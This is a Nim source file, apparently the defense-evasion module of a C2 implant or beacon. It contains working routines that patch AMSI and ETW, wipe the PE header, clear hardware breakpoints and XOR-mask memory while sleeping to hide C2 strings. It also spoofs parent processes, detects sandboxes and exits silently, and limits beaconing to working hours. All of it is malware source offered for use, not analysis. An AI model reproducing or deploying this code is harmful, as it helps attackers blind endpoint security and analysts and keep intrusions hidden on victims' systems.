## OPSEC evasion: AMSI, ETW, sleep mask, PE header wipe, HWBP clear, PPID spoof,
## sandbox detection, working-hours gating.

import winim/lean, winim/inc/tlhelp32
import std/[os, strutils, random]
import config
import ./syscalls

# ── Byte patching helper ──────────────────────────────────────────────────────
proc patchBytes(address: LPVOID; patch: openArray[byte]) =
  var oldProt: DWORD
  discard VirtualProtect(address, patch.len, PAGE_EXECUTE_READWRITE, addr oldProt)
  copyMem(address, unsafeAddr patch[0], patch.len)
  discard VirtualProtect(address, patch.len, oldProt, addr oldProt)

# ── AMSI ──────────────────────────────────────────────────────────────────────
proc patchAMSI*() =
  let amsi = LoadLibraryA("amsi.dll")
  if amsi == 0: return
  let fn = GetProcAddress(amsi, "AmsiScanBuffer")
  if fn == nil: return
  patchBytes(fn, [byte 0x33, 0xC0, 0xC3])  # xor eax,eax; ret

# ── ETW ───────────────────────────────────────────────────────────────────────
proc patchETW*() =
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0: return
  let fn = GetProcAddress(ntdll, "EtwEventWrite")
  if fn == nil: return
  patchBytes(fn, [byte 0x33, 0xC0, 0xC3])

proc disableETWProcess*() =
  ## NtSetInformationProcess — disables ETW without touching EtwEventWrite bytes.
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll == 0: return
  type FnT = proc(h: HANDLE; cls: ULONG; info: pointer; sz: ULONG): NTSTATUS {.stdcall.}
  let fn = cast[FnT](GetProcAddress(ntdll, "NtSetInformationProcess"))
  if fn == nil: return
  var flag: ULONG = 0
  discard fn(HANDLE(-1), 87, addr flag, sizeof(flag).ULONG)

# ── Wipe MZ signature ─────────────────────────────────────────────────────────
proc wipeMZHeader*() =
  ## Zero only the 'MZ' magic bytes — defeats memory scanners without crashing the runtime.
  let base = GetModuleHandleW(nil)
  if base == 0: return
  var old: DWORD
  discard VirtualProtect(cast[LPVOID](base), 2, PAGE_READWRITE, addr old)
  cast[ptr byte](base)[] = 0
  cast[ptr byte](base + 1)[] = 0
  discard VirtualProtect(cast[LPVOID](base), 2, old, addr old)

# ── Hardware breakpoint clear ─────────────────────────────────────────────────
proc clearHWBP*() =
  ## Zero DR0-DR3 and DR7 on the current thread — removes EDR hw breakpoints.
  let h = OpenThread(THREAD_GET_CONTEXT or THREAD_SET_CONTEXT, 0, GetCurrentThreadId())
  if h == 0: return
  defer: discard CloseHandle(h)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  if GetThreadContext(h, addr ctx) == 0: return
  ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0
  ctx.Dr6 = 0; ctx.Dr7 = 0
  discard SetThreadContext(h, addr ctx)

# ── Sleep masking (XOR encrypt non-exec PE sections during sleep) ─────────────
const XOR_SLEEP_KEY: byte = 0xA7

proc sleepMasked*(ms: int) =
  ## XOR-encrypts all non-executable PE sections (hides C2 URLs, strings, imports
  ## from memory scanners) then sleeps via NtDelayExecution (indirect syscall),
  ## then decrypts in-place. Executable sections (.text) are left untouched to
  ## avoid crashing when the sleep returns into our own code.
  if ms <= 0: return

  let base = GetModuleHandleW(nil)
  if base == 0:
    sleepViaNt(ms)
    return

  let dos = cast[ptr IMAGE_DOS_HEADER](base)
  let nt  = cast[PIMAGE_NT_HEADERS](cast[int](base) + dos.e_lfanew)
  let nsec = int(nt.FileHeader.NumberOfSections)
  let firstSec = IMAGE_FIRST_SECTION(nt)

  # Encrypt: XOR each non-executable section with the key.
  for i in 0 ..< nsec:
    let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0: continue
    if sh.SizeOfRawData == 0: continue
    let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
    let size    = sh.SizeOfRawData.int
    var old: DWORD
    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
    for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), old, addr old)

  # Sleep via indirect syscall — NtDelayExecution lives in ntdll, not our .text.
  sleepViaNt(ms)

  # Decrypt: same XOR pass restores original bytes.
  for i in 0 ..< nsec:
    let sh = cast[ptr IMAGE_SECTION_HEADER](cast[int](firstSec) + i * sizeof(IMAGE_SECTION_HEADER))
    if (sh.Characteristics and DWORD(IMAGE_SCN_MEM_EXECUTE)) != 0: continue
    if sh.SizeOfRawData == 0: continue
    let secAddr = cast[ptr UncheckedArray[byte]](cast[int](base) + sh.VirtualAddress.int)
    let size    = sh.SizeOfRawData.int
    var old: DWORD
    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), PAGE_READWRITE, addr old)
    for j in 0 ..< size: secAddr[j] = secAddr[j] xor XOR_SLEEP_KEY
    discard VirtualProtect(cast[LPVOID](secAddr), SIZE_T(size), old, addr old)

# ── PPID spoofing for child processes ─────────────────────────────────────────
const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS* = DWORD_PTR(0x00020000)

proc spawnWithPPID*(cmd: string; ppidProc: string = "explorer.exe"): bool =
  ## Spawn a process with a spoofed PPID (appears as child of ppidProc).
  ## Used when the agent needs to spawn sub-processes without revealing its lineage.

  # Find the target parent PID
  var parentPid: DWORD = 0
  let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  if snap == INVALID_HANDLE_VALUE: return false
  defer: discard CloseHandle(snap)

  var pe: PROCESSENTRY32W
  pe.dwSize = sizeof(pe).DWORD
  if Process32FirstW(snap, addr pe).bool:
    while true:
      let name = $cast[WideCString](addr pe.szExeFile[0])
      if name.toLowerAscii() == ppidProc.toLowerAscii():
        parentPid = pe.th32ProcessID
        break
      if not Process32NextW(snap, addr pe).bool: break

  if parentPid == 0: return false

  # Open parent process
  let hParent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parentPid)
  if hParent == 0: return false
  defer: discard CloseHandle(hParent)

  # Build STARTUPINFOEXW with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
  var siEx: STARTUPINFOEXW
  siEx.StartupInfo.cb = sizeof(siEx).DWORD
  var attrSize: SIZE_T
  discard InitializeProcThreadAttributeList(nil, 1, 0, addr attrSize)
  let attrList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, attrSize))
  defer: HeapFree(GetProcessHeap(), 0, attrList)
  discard InitializeProcThreadAttributeList(attrList, 1, 0, addr attrSize)
  discard UpdateProcThreadAttribute(attrList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    addr hParent, sizeof(hParent).SIZE_T, nil, nil)
  siEx.lpAttributeList = attrList

  var pi: PROCESS_INFORMATION
  let cmdW = newWideCString(cmd)
  let r = CreateProcessW(nil, cmdW, nil, nil, 0,
    CREATE_SUSPENDED or EXTENDED_STARTUPINFO_PRESENT,
    nil, nil, addr siEx.StartupInfo, addr pi)
  DeleteProcThreadAttributeList(attrList)
  if not r.bool: return false

  discard ResumeThread(pi.hThread)
  discard CloseHandle(pi.hThread)
  discard CloseHandle(pi.hProcess)
  return true

# ── Sandbox / analysis environment detection ──────────────────────────────────
proc sandboxCheck*() =
  ## Score-based sandbox detector. Exits silently if score ≥ 4.
  if IsDebuggerPresent() != 0: ExitProcess(0)  # immediate

  var score = 0

  var si: SYSTEM_INFO
  GetSystemInfo(addr si)
  if si.dwNumberOfProcessors < 2: inc score

  var ms: MEMORYSTATUSEX
  ms.dwLength = sizeof(ms).DWORD
  if GlobalMemoryStatusEx(addr ms) != 0:
    if ms.ullTotalPhys < DWORDLONG(512 * 1024 * 1024): score += 3
    elif ms.ullTotalPhys < DWORDLONG(1024 * 1024 * 1024): inc score

  var totalBytes: ULONGLONG = 0
  discard GetDiskFreeSpaceExW(newWideCString("C:\\"), nil,
    cast[PULARGE_INTEGER](addr totalBytes), nil)
  if totalBytes > 0 and totalBytes < ULONGLONG(40) * 1024 * 1024 * 1024: inc score

  var ubuf = newWideCString(newString(256))
  if GetEnvironmentVariableW(newWideCString("USERNAME"), ubuf, 256) > 0:
    let uname = ($ubuf).toLowerAscii()
    for s in ["sandbox", "malware", "virus", "analyst", "cuckoo", "maltest", "vmuser"]:
      if s in uname: score += 3; break

  if score >= 4: ExitProcess(0)

# ── Working-hours gating ──────────────────────────────────────────────────────
var workingHoursDyn* = WorkingHours  ## mutable at runtime via CONFIG task

proc inWorkingHours*(): bool =
  ## Returns true if the current time is inside the configured window.
  ## Empty WorkingHours string = always beacon.
  if workingHoursDyn == "": return true
  let idx = workingHoursDyn.find('-')
  if idx < 1: return true
  let sp = workingHoursDyn[0..<idx].split(':')
  let ep = workingHoursDyn[idx+1..^1].split(':')
  if sp.len != 2 or ep.len != 2: return true
  var sh, sm, eh, em: int
  try:
    sh = parseInt(sp[0]); sm = parseInt(sp[1])
    eh = parseInt(ep[0]); em = parseInt(ep[1])
  except: return true
  var st: SYSTEMTIME
  GetLocalTime(addr st)
  let cur = int(st.wHour) * 60 + int(st.wMinute)
  let s = sh * 60 + sm
  let e = eh * 60 + em
  if s <= e: return cur >= s and cur < e
  else: return cur >= s or cur < e  # overnight window e.g. 22:00-06:00

proc sleepUntilWorkHours*() =
  ## Sleep until the next working-hours window opens.
  if workingHoursDyn == "": return
  let idx = workingHoursDyn.find('-')
  if idx < 1: return
  let sp = workingHoursDyn[0..<idx].split(':')
  if sp.len != 2: return
  var sh, sm: int
  try: sh = parseInt(sp[0]); sm = parseInt(sp[1])
  except: return
  var st: SYSTEMTIME
  GetLocalTime(addr st)
  let cur = int(st.wHour) * 60 + int(st.wMinute)
  let s = sh * 60 + sm
  let waitMin = if cur < s: s - cur else: (24 * 60 - cur) + s
  if waitMin > 0: sleepMasked(waitMin * 60 * 1000)

# ── Apply all evasion at startup ──────────────────────────────────────────────
proc applyEvasion*() =
  sandboxCheck()     # exit early if sandbox / analysis env detected
  patchAMSI()
  patchETW()
  disableETWProcess()
  # clearHWBP() and wipeMZHeader() available as operator commands via SHELL
